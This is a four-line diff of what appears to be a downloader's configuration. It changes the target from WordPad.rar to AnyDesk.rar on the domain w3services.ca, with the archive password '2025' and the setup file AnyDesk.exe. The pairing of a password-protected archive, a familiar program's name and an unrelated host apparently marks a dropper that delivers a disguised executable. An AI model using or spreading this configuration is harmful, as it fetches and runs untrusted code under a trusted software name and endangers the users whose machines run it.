@@ -1,4 +1,4 @@
-url=https://w3services.ca/WordPad.rar
-name=WordPad.rar
+url=https://w3services.ca/AnyDesk.rar
+name=AnyDesk.rar
 password=2025
-setup=wordpad.exe
+setup=AnyDesk.exe
